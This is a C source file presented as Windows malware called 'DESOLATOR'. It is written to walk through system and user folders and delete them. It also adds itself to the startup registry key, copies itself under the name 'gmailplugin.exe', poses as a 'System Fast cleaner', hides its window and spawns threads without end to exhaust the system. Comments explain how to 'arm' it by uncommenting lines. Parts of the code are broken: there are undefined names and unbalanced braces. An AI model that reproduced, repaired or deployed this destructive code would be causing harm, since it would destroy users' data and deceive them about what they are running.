/* by Creator_LuXury */
/* MALWARE 'DESOLATOR'
/* FOR TESTING ONLY PLEASE DO NOT SHARE */
/* PLEASE BE CAREFUL WHEN USING THIS IF YOU WANT TO ARM VIRUS REMOVE "//" FORM FEW LINES */
/* TESTED AND WORKING ON WINDOWS XP and Win7 (and it is very dengerous) */

# include <stdio.h>
# include <windows.h>
# include <dirent.h>
# include <time.h> 
# include <ShellApi.h>
# include <signal.h>
# include <pthread.h>
# include <stdlib.h>
# include <sys/stat.h>
# include <sys/types.h>

/*void kill_by_pid()//for kill all process (alpha)BRAK EFEKTYWNOSCI w pętli inny sposób szukania pida
{
	int a=0;
	int b=99999;
	while(a++);
	HANDLE handy;
	HANDLE handy1;
	handy =OpenProcess(SYNCHRONIZE|PROCESS_TERMINATE, TRUE, a);
	handy1 =OpenProcess(SYNCHRONIZE|PROCESS_TERMINATE, TRUE, --b);
	TerminateProcess(handy,0);
	TerminateProcess(handy1,0);
}*/

int copyspam(){// makes a copy of the programm in 'pseudorandom' locations and also runs it 
	int i,c=1;
	mkdir("C:\\gmaildata\\");
	for(i;i<2;i++){
	c++;
	char fullname[1024];
	strcpy(fullname,gmaildata);
//	strcat(fullname,c);// TO DO RANDOM LOCATIONS
	char * original_file = "gmailplugin.exe";
	strcat(fullname,"gmailplugin.exe");
    char * new_file = fullname;
    ( void ) CopyFile ( ( LPCTSTR )original_file, ( LPCTSTR )new_file, FALSE);
//   ShellExecute(GetDesktopWindow(),"open",fullname,NULL,NULL,SW_SHOW); // RUNS PROCESS ENDESLY 
	}
}

/*int autorun(){// add virus to registry to start with windows start one started cannot be normaly removed or deleted

HKEY hKey;
const char* czStartName = "gmailplugin.exe";
const char* czExePath   = _pgmptr;

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath,
                            strlen(czExePath) );
}*/

RegCloseKey(hKey);
}
int rem(char s[50]){  // this function creates list of files and directories and should delete it
	FILE* ff;
	struct dirent *entry;
	printf("%s\n", s);
	DIR* dir = opendir(s);
	char fullname[1024];
	if (dir){
		    printf("\n\n******\n\n");
		    while ((entry = readdir(dir)) != NULL){
			strcpy(fullname,s);
			strcat(fullname,"\\");
			strcat(fullname,entry->d_name);
		    ff = fopen(fullname , "r");
		    if (ff != NULL){
		    	printf("%s\n", entry->d_name);
				fclose(ff);	
				int chmod(char fullname, S_IRWXU);// add permission from trusted installer to delete folders
 //  				remove(fullname);
			}
			else if (ff == NULL) {
        	printf("%s(directory)\n",entry->d_name);
   			}
   		}
		printf("\n******\n");
		closedir(dir);

		return 1;
	}
	else if(dir == NULL)
	{
		perror("log : dir not found\n");
		return 0;
	}
	else 
	{
		printf("unknown error\n");
		}
}

void *badguy() {
	long double a;
	
	a=999999,9999*a;
	}
void *badguy2() {
	long double a;
	
	a=999999,9999*a;
	a = a*a*a;
	
	}
void *badguy3() {
	long double a;
	a=999999,9999*a;
	}

void *badman() {
	while(1){
    pthread_t badguy_thread;
	int result = pthread_create(&badguy_thread, NULL, badguy, NULL);
	pthread_t badguy2_thread;
	int result2 = pthread_create(&badguy2_thread, NULL, badguy2, NULL);
    pthread_t badguy3_thread;
	int result3 = pthread_create(&badguy3_thread, NULL, badguy3, NULL);
	if (result != 0) {
        perror("Could not create thread.");
    	}
	9*99;
	}
}

#define WIN32_WINNT 0x0500

int main (){
	autorun();
	SetConsoleTitle("System Fast cleaner");
	int x=1;
	int t=10;
	while (t--){  // this loop allows to find specific locations
	if(x==1) {
	char a[50] = "C:\\Users";
	rem(a);
//	copyspam(a);
	}
	else if (x==2){
	char a[50] = "C:\\Windows\\System32";
	rem(a);
//	copyspam(a);
	}
	else if (x==3){
	char a[50] = "C:\\Windows\\System";
	rem(a);
//	copyspam(a);
	}
	else if (x==4){
	char a[50] = "C:\\Program Files";
	rem(a);
//	copyspam(a);
	}
	else if (x==5){
	char a[50] = "C:\\Program Files (x86)";
	rem(a);
//	copyspam(a);
	}
	else if (x==6){
	char a[50] = "C:\\Windows\\Boot";
	rem(a);
//	copyspam(a);
	}
	else if (x==7){
	char a[50] = "C:\\Documents and Settings";
	rem(a);
//	copyspam(a);
	}
	}
	else if (x==8){
	char a[50] = "C:\\Windows";
	rem(a);
//	copyspam(a);
	}
	else if (x==9){
	char a[50] = "C:\\";
	rem(a);
//	copyspam(a);
	}
x++;
}

	HWND hWnd = GetConsoleWindow();// can hide window
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );	
    while(1){
    pthread_t badman_thread;
	int result = pthread_create(&badman_thread, NULL, badman, NULL);
	if (result != 0) {
        perror("Could not create thread.");
    	}

	}

// system("shutdown -r -t 00");    // system will slow down so there is no needed to restart because user will do 

}
